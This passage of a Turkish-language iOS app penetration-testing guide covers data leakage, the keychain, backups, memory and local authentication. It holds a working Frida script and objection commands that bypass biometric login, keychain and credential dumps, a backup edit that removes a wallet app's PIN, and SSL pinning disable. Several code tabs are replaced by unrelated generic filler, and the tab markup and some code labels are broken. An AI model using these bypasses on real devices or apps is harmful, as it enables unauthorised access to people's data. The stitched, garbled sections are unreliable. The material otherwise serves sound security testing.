iPhone jailbreak yapılmamışsa, **saldırganın** bu ekran görüntülerini görmek için **cihaza erişimi** **engellenmemiş** olmalıdır. Varsayılan olarak, son anlık görüntü uygulamanın sandbox'ında `Library/Caches/Snapshots/` veya `Library/SplashBoard/Snapshots` klasöründe saklanır (güvenilir bilgisayarlar iOX 7.0'dan itibaren dosya sistemine erişemez).

Bu kötü davranışı önlemenin bir yolu, anlık görüntüyü almadan önce duyarlı verileri kaldırmak veya bir boş ekran kullanmaktır, bunu `ApplicationDidEnterBackground()` işlevini kullanarak yapabilirsiniz.

Aşağıdaki, varsayılan bir ekran görüntüsü ayarlayan örnek bir düzeltme yöntemidir.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
**Objective-C:**
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
### Arka Plan Resmi Ayarı

Uygulama arka planda çalıştığında `overlayImage.png` dosyasını arka plan resmi olarak ayarlar. Bu, `overlayImage.png` dosyasının her zaman mevcut görünümü geçersiz kılacağından hassas veri sızıntılarını önler.

### Keychain

iOS anahtar zincirine erişmek ve yönetmek için, jailbreak yapılmış cihazlar için uygun olan [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) gibi araçlar mevcuttur. Ayrıca, benzer amaçlar için [**Objection**](https://github.com/sensepost/objection) `ios keychain dump` komutunu sağlar.

#### **Kimlik Bilgilerini Saklama**

**NSURLCredential** sınıfı, hassas bilgileri doğrudan anahtar zincirine kaydetmek için idealdir ve NSUserDefaults veya diğer sarmallara gerek kalmadan kullanılır. Giriş yaptıktan sonra kimlik bilgilerini saklamak için aşağıdaki Swift kodu kullanılır:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Storedaki bu kimlik bilgilerini çıkarmak için Objection'ın `ios nsurlcredentialstorage dump` komutu kullanılır.

## **Özel Klavyeler ve Klavye Önbelleği**

iOS 8.0'dan itibaren kullanıcılar, **Ayarlar > Genel > Klavye > Klavyeler** altında yönetilebilen özel klavye uzantıları yükleyebilirler. Bu klavyeler genişletilmiş işlevsellik sunarken, tuş vuruşu kaydı tutma ve verileri harici sunuculara iletim riski oluştururlar, ancak kullanıcılar ağ erişimi gerektiren klavyeler hakkında bilgilendirilir. Uygulamalar, hassas bilgi girişi için özel klavyelerin kullanımını kısıtlayabilir ve kısıtlamalıdır.

**Güvenlik Önerileri:**

* Güvenliği artırmak için üçüncü taraf klavyelerin devre dışı bırakılması önerilir.
* iOS'un varsayılan klavyesinin otomatik düzeltme ve otomatik öneriler özelliklerine dikkat edilmelidir, çünkü bu özellikler hassas bilgileri `Library/Keyboard/{locale}-dynamic-text.dat` veya `/private/var/mobile/Library/Keyboard/dynamic-text.dat` konumunda bulunan önbellek dosyalarına kaydedebilir. Bu önbellek dosyaları düzenli olarak hassas veriler açısından kontrol edilmelidir. Önbellek verilerini temizlemek için **Ayarlar > Genel > Sıfırla > Klavye Sözlüğünü Sıfırla** üzerinden klavye sözlüğünü sıfırlamak önerilir.
* Ağ trafiğinin dinlenmesi, özel bir klavyenin tuş vuruşlarını uzaktan iletip iletemediğini ortaya çıkarabilir.

### **Metin Alanı Önbelleğini Önleme**

[UITextInputTraits protokolü](https://developer.apple.com/reference/uikit/uitextinputtraits), otomatik düzeltme ve güvenli metin girişini yönetmek için gerekli olan özellikleri sunar ve hassas bilgi önbelleğini önlemek için esastır. Örneğin, otomatik düzeltmeyi devre dışı bırakma ve güvenli metin girişini etkinleştirme şu şekilde gerçekleştirilebilir:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Ek olarak, geliştiriciler metin alanlarının, özellikle şifreler ve PIN'ler gibi hassas bilgilerin girildiği alanların önbelleğe alınmasını engellemek için `autocorrectionType`'ı `UITextAutocorrectionTypeNo` olarak ve `secureTextEntry`'i `YES` olarak ayarlayarak güvence altına almalıdır.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Kayıtlar**

Hata ayıklama kodu genellikle **günlüğü kullanmayı** gerektirir. **Kayıtlar hassas bilgiler içerebileceğinden risk içerir**. Daha önce, iOS 6 ve önceki sürümlerinde, günlüklere tüm uygulamalar erişebiliyordu, bu da hassas veri sızıntısı riski oluşturuyordu. **Şimdi, uygulamalar yalnızca kendi günlüklerine erişebilirler**.

Bu kısıtlamalara rağmen, **kilitli bir cihaza fiziksel erişimi olan bir saldırgan**, cihazı bir bilgisayara bağlayarak bu durumu hala sömürebilir ve **kayıtları okuyabilir**. Kayıtların uygulamanın kaldırılmasından sonra bile diske kalması önemlidir.

Riskleri azaltmak için, uygulama ile **etkileşimi detaylı bir şekilde** incelemek, tüm işlevlerini ve girdilerini keşfetmek ve yanlışlıkla hassas bilgilerin kaydedilmediğinden emin olmak önerilir.

Potansiyel sızıntılar için uygulamanın kaynak kodunu inceleyerek, `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` gibi yerleşik işlevler için **önceden tanımlanmış** ve özel günlükleme ifadeleri için `Logging` veya `Logfile` gibi anahtar kelimeleri arayın.

### **Sistem Kayıtlarını İzleme**

Uygulamalar çeşitli hassas bilgileri kaydeder. Bu kayıtları izlemek için, araçlar ve komutlar gibi:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
Ayrıca, **Xcode** konsol log'larını toplamanın bir yolunu sağlar:

1. Xcode'u açın.
2. iOS cihazını bağlayın.
3. **Window** -> **Devices and Simulators**'e gidin.
4. Cihazınızı seçin.
5. Araştırdığınız sorunu tetikleyin.
6. Logları yeni bir pencerede görüntülemek için **Open Console** düğmesini kullanın.

Daha gelişmiş loglama için, cihaz kabuğuna bağlanmak ve **socat** kullanarak gerçek zamanlı log izleme sağlayabilir.
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Log aktivitelerini gözlemlemek için kullanılan komutlar, sorunları teşhis etmek veya günlüklerde potansiyel veri sızıntılarını belirlemek için son derece değerli olabilir.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçları tarafından desteklenen **otomatik iş akışları** oluşturabilir ve otomatikleştirebilirsiniz.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Yedeklemeler

iOS'e entegre edilmiş **otomatik yedekleme özellikleri**, iTunes (macOS Catalina'ya kadar), Finder (macOS Catalina'dan itibaren) veya iCloud aracılığıyla cihaz veri kopyalarının oluşturulmasını kolaylaştırır. Bu yedeklemeler neredeyse tüm cihaz verilerini kapsar, Apple Pay ayrıntıları ve Touch ID yapılandırmaları gibi son derece hassas unsurları hariç tutar.

### Güvenlik Riskleri

Yedeklemelerde **kurulu uygulamalar ve verilerinin** bulunması, potansiyel **veri sızıntısı** sorununu ve **yedekleme değişikliklerinin uygulama işlevselliğini değiştirebileceği riskini** ortaya çıkarır. Bu riskleri azaltmak için **duyarlı bilgileri düz metin olarak saklamamak** önerilir.

### Yedeklemelerden Dosyaları Hariç Tutma

`Documents/` ve `Library/Application Support/` içindeki dosyalar varsayılan olarak yedeklenir. Geliştiriciler, `NSURLIsExcludedFromBackupKey` ile `NSURL setResourceValue:forKey:error:` kullanarak belirli dosyaları veya dizinleri yedeklemelerden hariç tutabilir. Bu uygulama, hassas verilerin yedeklemelere dahil edilmesini önlemek için önemlidir.

### Zafiyetlerin Test Edilmesi

Bir uygulamanın yedekleme güvenliğini değerlendirmek için, Finder kullanarak bir yedekleme oluşturun ve ardından [Apple'ın resmi belgelerinden](https://support.apple.com/en-us/HT204215) rehberlik alarak yedeği bulun. Yedeği hassas veriler veya yapılandırmalar açısından analiz ederek uygulama davranışını etkileyebilecek değişiklikler yapılabilir.

Hassas bilgiler, komut satırı araçları veya [iMazing](https://imazing.com) gibi uygulamalar kullanılarak aranabilir. Şifreli yedeklemeler için, şifrelemenin varlığı, yedeğin kökünde bulunan "Manifest.plist" dosyasındaki "IsEncrypted" anahtarını kontrol ederek doğrulanabilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Şifrelenmiş yedeklemelerle uğraşmak için, [DinoSec'in GitHub deposundaki](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts) Python betikleri, örneğin **backup\_tool.py** ve **backup\_passwd.py**, son iTunes/Finder sürümleriyle uyumluluk için ayarlamalar gerektirebilecek olsa da yararlı olabilir. Şifre korumalı yedeklemelerdeki dosyalara erişim için başka bir seçenek olan [**iOSbackup** aracı](https://pypi.org/project/iOSbackup/) bulunmaktadır.

### Uygulama Davranışını Değiştirme

Yedekleme değişiklikleri aracılığıyla uygulama davranışını değiştirme örneği, [Bither bitcoin cüzdan uygulamasında](https://github.com/bither/bither-ios) gösterilmektedir, burada UI kilidi PIN'inin **pin\_code** anahtarı altında `net.bither.plist` içinde saklandığı görülmektedir. Bu anahtarı plist'ten kaldırarak ve yedeği geri yükleyerek PIN gereksinimini kaldırarak sınırsız erişim sağlanabilir.

## Hassas Veriler İçin Bellek Testi Özeti

Bir uygulamanın belleğinde saklanan hassas bilgilerle uğraşırken, bu verilerin maruz kalma süresini sınırlamak çok önemlidir. Bellek içeriğini araştırmak için iki temel yaklaşım vardır: **bir bellek dökümü oluşturmak** ve **belleği gerçek zamanlı olarak analiz etmek**. Her iki yöntemin de, döküm süreci veya analiz sırasında kritik verilerin kaçırılma potansiyeli gibi zorlukları vardır.

## **Bir Bellek Dökümü Alıp Analiz Etmek**

Hem jailbreak yapılmış hem de yapılmamış cihazlar için, [objection](https://github.com/sensepost/objection) ve [Fridump](https://github.com/Nightbringer21/fridump) gibi araçlar bir uygulamanın işlem belleğini dökme imkanı sağlar. Bir kez döküldüğünde, bu verilerin analizi, aradığınız bilginin doğasına bağlı olarak çeşitli araçlar gerektirir.

Bir bellek dökümünden dizeleri çıkarmak için `strings` veya `rabin2 -zz` gibi komutlar kullanılabilir:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Daha detaylı bir analiz için, belirli veri türleri veya desenler aramak için **radare2**, kapsamlı arama yetenekleri sunar:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Çalışma Zamanı Bellek Analizi**

**r2frida**, bir uygulamanın belleğini bir bellek dökümüne ihtiyaç duymadan gerçek zamanlı olarak incelemek için güçlü bir alternatif sunar. Bu araç, çalışan uygulamanın belleği üzerinde arama komutlarının doğrudan yürütülmesini sağlar:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Kırık Şifreleme

### Zayıf Anahtar Yönetimi Süreçleri

Bazı geliştiriciler hassas verileri yerel depolamada saklar ve kodda sabit/tahmin edilebilir bir anahtarla şifreler. Bu yapılmamalı çünkü bazı tersine mühendislik saldırıları, saldırganların gizli bilgileri çıkarmasına izin verebilir.

### Güvensiz ve/veya Kullanımdan Kaldırılmış Algoritmaların Kullanımı

Geliştiriciler **kullanımdan kaldırılmış algoritmaları** kullanmamalıdır **yetkilendirme kontrolü**, **veri depolama** veya **gönderme** işlemleri için. Bu algoritmaların bazıları: RC4, MD4, MD5, SHA1... Örneğin şifreleri depolamak için **hash** kullanılıyorsa, hashlerin tuz ile birlikte kullanıldığı kaba kuvvet saldırılarına dayanıklı olmalıdır.

### Kontrol

Yapılması gereken ana kontroller, kod içinde **sabitlenmiş** şifreler/sırlar bulunup bulunmadığını, bunların **tahmin edilebilir** olup olmadığını ve kodun bazı türde **zayıf** **şifreleme** algoritmalarını kullanıp kullanmadığını bulmaktır.

İlginç olan şudur ki, **objection** kullanarak bazı **şifreleme** **kütüphanelerini** otomatik olarak **izleyebilirsiniz**.
```swift
ios monitor crypt
```
iOS şifreleme API'ları ve kütüphaneleri hakkında **daha fazla bilgi** için [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Yerel Kimlik Doğrulama

**Yerel kimlik doğrulama**, özellikle uzaktaki bir uç noktaya şifreleme yöntemleri aracılığıyla erişimi koruma konusunda önemli bir rol oynar. Buradaki esas nokta, uygun şekilde uygulanmadığında yerel kimlik doğrulama mekanizmalarının atlatılabilir olabileceğidir.

Apple'ın [**Yerel Kimlik Doğrulama çerçevesi**](https://developer.apple.com/documentation/localauthentication) ve [**anahtarlık**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html), geliştiricilere kullanıcı kimlik doğrulama iletişim kutularını kolaylaştırmak ve sırlı verileri güvenli bir şekilde işlemek için sağlam API'lar sağlar. Güvenli Kasa, Parmak İzi Kimliği için parmak izi kimliğini güvence altına alırken, Yüz Kimliği biyometrik verileri tehlikeye atmadan yüz tanıma üzerine kuruludur.

Touch ID/Face ID'yi entegre etmek için geliştiricilerin iki API seçeneği vardır:

* Yüksek seviyeli kullanıcı kimlik doğrulaması için **`LocalAuthentication.framework`**.
* Düşük seviyeli anahtarlık hizmetlerine erişim için **`Security.framework`**, biyometrik kimlik doğrulaması ile sırlı verileri güvence altına alır. Çeşitli [açık kaynaklı sarmallar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtarlık erişimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework`, genellikle kimlik doğrulama süreçleri için veri iletimi yapmadan öncelikle boolean değerler döndürdükleri için güvenlik açıkları sunarlar, bu da onları atlanabilir hale getirir (bkz. [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik Doğrulaması Uygulamak

Kullanıcıları kimlik doğrulaması için yönlendirmek için geliştiricilerin **`LAContext`** sınıfı içindeki **`evaluatePolicy`** yöntemini kullanmaları gerekmektedir, aşağıdakiler arasından seçim yaparak:

* **`deviceOwnerAuthentication`**: Touch ID veya cihaz şifresi istemek, ikisi de etkin değilse başarısız olur.
* **`deviceOwnerAuthenticationWithBiometrics`**: Yalnızca Touch ID istemek.

Başarılı bir kimlik doğrulama, **`evaluatePolicy`** yönteminden gelen boolean bir değerle gösterilir, potansiyel bir güvenlik açığına işaret eder.

### Anahtarlık Kullanarak Yerel Kimlik Doğrulaması

iOS uygulamalarında **yerel kimlik doğrulaması** uygulamak, kimlik doğrulama belgeleri gibi sırlı verileri güvenli bir şekilde saklamak için **anahtarlık API'ları** kullanımını içerir. Bu süreç, verinin yalnızca kullanıcı tarafından, cihaz şifresi veya Touch ID gibi biyometrik kimlik doğrulama kullanılarak erişilebileceğini sağlar.

Anahtarlık, `SecAccessControl` özelliği ile öğeleri ayarlamayı sağlar, bu da kullanıcının Touch ID veya cihaz şifresi ile başarılı bir şekilde kimlik doğrulamasını yapana kadar öğeye erişimi kısıtlar. Bu özellik güvenliği artırmak için önemlidir.

Aşağıda, Swift ve Objective-C'de bir dizeyi anahtarlığa kaydetme ve geri almayı gösteren kod örnekleri bulunmaktadır, bu güvenlik özelliklerini kullanarak erişim kontrolünü ayarlamayı ve verinin yalnızca ayarlandığı cihazda, bir cihaz şifresinin yapılandırıldığı koşul altında erişilebilir olmasını sağlamayı özellikle göstermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}

### iOS Uygulama Pentesting

Bu bölümde, iOS uygulamalarını pentest etmek için kullanılabilecek bazı temel teknikler ve araçlar hakkında bilgi bulabilirsiniz.

#### Araçlar

- **MobSF**: Otomatik olarak iOS uygulamalarını analiz etmek için kullanılan açık kaynaklı bir mobil güvenlik çerçevesi.
- **Needle**: iOS uygulamalarını test etmek için kullanılan bir framework.
- **Cycript**: iOS uygulamalarını canlı olarak analiz etmek için kullanılan bir araç.
- **Clutch**: iOS uygulamalarını kırıp çıkarmak için kullanılan bir araç.
- **Frida**: Dinamik olarak iOS uygulamalarını manipüle etmek için kullanılan bir araç.

#### Temel Teknikler

- **Tersine Mühendislik**: Uygulamanın çalışma mantığını anlamak için kullanılır.
- **Veri Depolama Analizi**: Uygulamanın yerel olarak depoladığı hassas verileri bulmak için kullanılır.
- **Ağ Trafik Analizi**: Uygulamanın ağ trafiğini izleyerek hassas verilerin nasıl iletilip alındığını anlamak için kullanılır.
- **Güvenlik Zafiyetleri Analizi**: Uygulamada yaygın güvenlik zafiyetlerini araştırmak için kullanılır.

Bu temel teknikler ve araçlar, iOS uygulamalarını pentest etmek için başlangıç noktanız olabilir. Daha fazla bilgi edinmek ve becerilerinizi geliştirmek için pratik yapmayı unutmayın!

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Artık anahtarlıkta kaydedilen öğeyi isteyebiliriz. Anahtarlık hizmetleri, kullanıcıya kimlik doğrulama iletişim kutusunu sunacak ve uygun bir parmak izi sağlanıp sağlanmadığına bağlı olarak veri veya nil döndürecektir.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}

## Objective-C

Objective-C is the primary programming language used for iOS app development. When performing iOS pentesting, it is essential to understand Objective-C code to identify security vulnerabilities effectively.

### Tools for Analyzing Objective-C Code

There are several tools available for analyzing Objective-C code during iOS pentesting:

1. **Hopper Disassembler**: A reverse engineering tool that can be used to disassemble, decompile, and debug applications.

2. **class-dump**: A command-line utility that generates Objective-C headers from Mach-O files.

3. **otool**: A command-line tool for examining the contents of Mach-O files.

4. **IDA Pro**: A powerful disassembler and debugger that supports Objective-C.

### Common Vulnerabilities in Objective-C Code

Some common security vulnerabilities found in Objective-C code include:

- **Insecure Data Storage**: Storing sensitive data in an insecure manner.
- **Input Validation Issues**: Failing to properly validate user input.
- **Insecure Communication**: Transmitting data over insecure channels.
- **Memory Management Errors**: Improper handling of memory can lead to vulnerabilities like buffer overflows.

By using the mentioned tools and understanding common vulnerabilities, security professionals can effectively identify and mitigate security risks in Objective-C code during iOS pentesting.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Tespit

Uygulamadaki çerçevelerin kullanımı, uygulama ikili dosyasının paylaşılan dinamik kütüphaneler listesini analiz edilerek de tespit edilebilir. Bunun için `otool` kullanılabilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
Eğer bir uygulamada `LocalAuthentication.framework` kullanılıyorsa, çıktı hem aşağıdaki satırları içerecektir (unutmayın ki `LocalAuthentication.framework` aslında `Security.framework`'ü kullanır):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Eğer `Security.framework` kullanılıyorsa, sadece ikinci olan gösterilecektir.

### Yerel Kimlik Doğrulama Çerçevesi Atlatma

#### **Objection**

**Objection Biyometrik Atlatma** aracılığıyla, [bu GitHub sayfasında](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) bulunan bir teknik, **LocalAuthentication** mekanizmasını aşmak için mevcuttur. Bu yaklaşımın özü, `evaluatePolicy` fonksiyonunu manipüle etmek için **Frida**'yı kullanmaktır, böylece gerçek kimlik doğrulama başarısından bağımsız olarak sürekli olarak `True` sonucu vermesini sağlar. Bu, hatalı biyometrik kimlik doğrulama süreçlerini atlamak için özellikle yararlıdır.

Bu atlatmayı etkinleştirmek için aşağıdaki komut kullanılır:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'ın bir görev kaydettiği bir sıra başlatır ve `evaluatePolicy` kontrolünün sonucunu etkili bir şekilde `True` olarak değiştirir.

#### Frida

[DVIA-v2 uygulaması](https://github.com/prateek147/DVIA-v2)'ndan **`evaluatePolicy`** kullanımına bir örnek:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
**Yerel Kimlik Doğrulaması**nın **atlatılması** için bir Frida betiği yazılır. Bu betik, **evaluatePolicy** kontrolünü hedef alarak, geri aramasını onaylamak için **success=1** değerini döndürmesini sağlar. Geri aramanın davranışını değiştirerek, kimlik doğrulama kontrolü etkili bir şekilde atlatılır.

Aşağıdaki betik, **evaluatePolicy** yönteminin sonucunu değiştirmek için enjekte edilir. Geri aramanın sonucunu her zaman başarı olarak gösterir.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiği enjekte etmek ve biyometrik kimlik doğrulamasını atlamak için aşağıdaki komut kullanılır:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC Aracılığıyla Hassas Fonksiyonelliğin Açığa Çıkması

### Özel URI İşleyicileri / Derin Bağlantılar / Özel Şemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel Bağlantılar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity Paylaşımı

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama Uzantıları

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web Görünümleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serileştirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Ağ İletişimi

**Şifreleme olmadan** gerçekleşen iletişimi kontrol etmek önemlidir ve ayrıca uygulamanın sunucunun TLS sertifikasını doğru bir şekilde **doğruladığından** emin olmak da önemlidir.\
Bu tür sorunları kontrol etmek için **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ana Bilgisayar Adı Kontrolü

TLS sertifikasını doğrularken karşılaşılan yaygın bir sorun, sertifikanın bir **güvenilir CA** tarafından imzalandığını kontrol etmek, ancak sertifikanın **erişilen ana bilgisayar adı** olup olmadığını kontrol etmemektir.\
Bu sorunu Burp kullanarak kontrol etmek için, iPhone'da Burp CA'ya güven verdikten sonra, Burp ile farklı bir ana bilgisayar adı için yeni bir sertifika **oluşturabilir ve kullanabilirsiniz**. Uygulama hala çalışıyorsa, bir zafiyet olabilir.

### Sertifika Pinleme

Bir uygulama SSL Pinning'i doğru bir şekilde kullanıyorsa, uygulama yalnızca beklenen sertifika olduğunda çalışır. Bir uygulamayı test ederken **bu bir sorun olabilir çünkü Burp kendi sertifikasını sunar.**\
Bu korumayı bir jailbroken cihazda atlamak için, uygulamayı [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) yükleyebilirsiniz.

Ayrıca **objection**'ın `ios sslpinning disable` komutunu kullanabilirsiniz.

## Çeşitli

* **`/System/Library`** dizininde, sistem uygulamaları tarafından kullanılan telefon üzerinde yüklü çerçeveleri bulabilirsiniz.
* Kullanıcı tarafından App Store'dan yüklenen uygulamalar **`/User/Applications`** dizininde bulunur.
* Ve **`/User/Library`** kullanıcı düzeyindeki uygulamalar tarafından kaydedilen verileri içerir.
* Uygulama içinde kaydedilen notları okumak için **`/User/Library/Notes/notes.sqlite`**'e erişebilirsiniz.
